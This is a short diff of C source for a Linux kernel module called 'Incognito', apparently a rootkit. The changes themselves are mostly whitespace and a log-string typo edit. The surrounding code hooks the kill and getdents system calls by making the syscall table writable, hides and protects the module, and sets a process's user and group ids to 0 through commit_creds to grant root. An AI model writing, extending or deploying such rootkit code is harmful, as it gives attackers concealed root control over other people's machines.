@@ -115,7 +115,7 @@ static asmlinkage long (*originalKill)(pid_t pid, int sig);
 asmlinkage long hijackedGetdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 static asmlinkage long hijackedKill(pid_t pid, int sig);
 
-//page tool code
+//page code
 static int page_read_write(ulong address)
 {
         uint level;
@@ -220,7 +220,7 @@ void root(void)
 	//printk(KERN_INFO "changing %d - %s ; uid %d\n",task->pid,task->comm,task->real_cred->uid.val);
 	creds->uid.val = 0;
 	creds->euid.val = 0;
-    creds->gid.val = 0;
+    	creds->gid.val = 0;
 	creds->egid.val = 0;
 
 	//FYI THESE WILL CRASH LINUX
@@ -229,7 +229,7 @@ void root(void)
 	//creds->fsuid.val = 0;
 	//creds->fsgid.val = 0;
 
-	printk(KERN_WARNING "Incogntion: pid %d , %s is now root\n",task->pid,task->comm);
+	printk(KERN_WARNING "Incogntio: pid %d , %s is now root\n",task->pid,task->comm);
 
 	commit_creds(creds);
 
@@ -441,16 +441,16 @@ int __init incognito_init(void)
 
 	//Start Incgontio hidden and protected
 	hide();
-    protect();
+    	protect();
 
 	//System Calls
 	page_read_write((ulong)sys_call_table);
 
-    //hook getdents
-    HOOK(sys_call_table, originalKill, hijackedKill, __NR_kill);
+    	//hook getdents
+   	HOOK(sys_call_table, originalKill, hijackedKill, __NR_kill);
 
-    //get getdents
-    initializeHijack();
+    	//get getdents
+    	initializeHijack();
 
 	page_read_only((ulong)sys_call_table);
 
@@ -464,18 +464,18 @@ int __init incognito_init(void)
 	//we immediately reveal since we have no way to enter commands yet!
 	//if you remove this atm you won't be able to find incognito >:)
 	//reveal();
-    //unprotect();
-  return 0;
+    	//unprotect();
+ 	 return 0;
 }
 
 void __exit incognito_exit(void)
 {
 	//unhook our hijacked calls
 	page_read_write((ulong)sys_call_table);
-    //Unhook getdents last (this unhides processes)
-    UNHOOK(sys_call_table, originalKill, __NR_kill);
-    //pull out of getdents
-    exitHijack();
+    	//Unhook getdents last (this unhides processes)
+    	UNHOOK(sys_call_table, originalKill, __NR_kill);
+    	//pull out of getdents
+    	exitHijack();
 	page_read_only((ulong)sys_call_table);
     printk("Incognito: Module Removed\n"
     "Incognito has successfuly revealed and removed itself!\n"
